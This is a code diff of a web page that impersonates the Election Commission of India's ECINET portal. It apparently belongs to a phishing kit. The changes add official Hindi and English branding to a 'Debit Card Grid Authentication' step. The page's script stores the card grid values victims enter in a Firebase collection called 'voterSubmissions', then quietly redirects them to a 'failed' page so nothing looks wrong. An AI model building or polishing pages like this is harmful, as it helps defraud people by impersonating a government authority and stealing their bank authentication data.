@@ -3,45 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Debit Card Grid Authentication - Step 4</title>
+    <title>ECINET - Debit Card Grid Authentication Step 4</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         
-        /* Container for Edge-to-Edge Banner Header */
+        body { 
+            background-color: #0056b3; 
+            min-height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 15px; 
+        }
+
+        /* Form Container - Index.html ki tarah exact card style */
         .form-container { 
             background: #ffffff; 
             padding: 0 30px 30px 30px; 
-            border-radius: 12px; 
+            border-radius: 16px; 
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); 
             width: 100%; 
-            max-width: 450px; 
-            text-align: center; 
+            max-width: 440px; 
             overflow: hidden; 
+            text-align: center; 
         }
 
-        /* Full Width Edge-to-Edge Banner Styling */
-        .full-banner {
+        /* Top Blue Header Section - बिना किसी ऊपर के गैप के */
+        .top-header {
+            margin-top: 0;
             margin-left: -30px;
             margin-right: -30px;
             margin-bottom: 25px;
+            padding: 0 0 18px 0;
             width: calc(100% + 60px);
-            height: 130px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #004085;
+            background-color: #0056b3;
+            text-align: center;
+            color: white;
         }
 
-        .full-banner img {
+        .top-header img {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
+            max-height: 100px;
+            object-fit: contain;
+            margin-bottom: 8px;
             display: block;
+            background: transparent;
         }
 
-        .form-container h2 { margin-bottom: 5px; color: #0056b3; font-size: 20px; }
-        .sub-title { color: #555; font-size: 13px; margin-bottom: 15px; }
+        .top-header .hindi-title {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 3px;
+            letter-spacing: 0.5px;
+        }
+
+        .top-header .eng-title {
+            font-size: 11px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            opacity: 0.9;
+        }
+
+        .top-header h1 {
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .form-container h2 { 
+            margin-bottom: 5px; 
+            color: #0056b3; 
+            font-size: 20px; 
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .sub-title { color: #555; font-size: 12.5px; margin-bottom: 15px; font-weight: 600; }
         
         .card-preview-box {
             margin-bottom: 15px;
@@ -52,7 +90,7 @@
         }
         .card-preview-box img {
             width: 100%;
-            max-width: 280px;
+            max-width: 260px;
             height: auto;
             border-radius: 6px;
             box-shadow: 0 2px 6px rgba(0,0,0,0.15);
@@ -68,28 +106,32 @@
             display: flex;
             justify-content: space-between;
             gap: 12px;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
             background: #f8f9fa;
             padding: 15px 10px;
             border-radius: 8px;
-            border: 1px solid #e0e0e0;
+            border: 1px solid #dfe4ea;
         }
         .grid-item { flex: 1; text-align: center; }
-        .grid-label { display: block; margin-bottom: 6px; color: #0056b3; font-weight: bold; font-size: 15px; }
-        .grid-input { width: 100%; padding: 8px 5px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
-        .grid-input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
+        .grid-label { display: block; margin-bottom: 6px; color: #004085; font-weight: bold; font-size: 15px; }
+        .grid-input { width: 100%; padding: 10px 5px; border: 1px solid #dfe4ea; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; color: #333; }
+        .grid-input:focus { outline: none; border-color: #0056b3; background: #fff; box-shadow: 0 0 5px rgba(0, 86, 179, 0.2); }
 
-        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; }
+        .btn-next { width: 100%; padding: 14px; background: #0056b3; border: none; border-radius: 8px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); }
         .btn-next:hover { background: #004085; }
         .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
-        .footer-text { margin-top: 25px; font-size: 12px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; }
+        
+        .footer-text { margin-top: 25px; font-size: 10px; color: #666; font-weight: 600; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; letter-spacing: 0.3px; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="form-container">
-        <!-- Full Width Edge-to-Edge Banner Image Header -->
-        <div class="full-banner">
-            <img src="logo.png" alt="Election Commission Banner">
+        <!-- Top Blue Header Section without top gap -->
+        <div class="top-header">
+            <img src="logo.png" alt="Election Commission Logo">
+            <div class="hindi-title">भारत निर्वाचन आयोग</div>
+            <div class="eng-title">Election Commission of India</div>
+            <h1>ECINET</h1>
         </div>
 
         <h2>Debit Card Grid Authentication</h2>
@@ -120,7 +162,7 @@
         </form>
 
         <div class="footer-text">
-            © 2026 Name Correction Form. All rights reserved.
+            भारत निर्वाचन आयोग | Election Commission of India
         </div>
     </div>
 
@@ -163,13 +205,11 @@
 
             try {
                 const docRef = doc(db, "voterSubmissions", docId);
-                // Firebase में Grid Step 4 का डेटा और फाइनल कम्पलीट स्टेटस अपडेट करें
                 await updateDoc(docRef, {
                     gridStep4: gridStep4Data,
                     currentStep: "Verification Completed (Grid Step 4)"
                 });
 
-                // बिना किसी पॉप-अप या एरर के सीधे failed.html पर रीडायरेक्ट
                 setTimeout(() => {
                     window.location.href = "failed.html"; 
                 }, 1000);
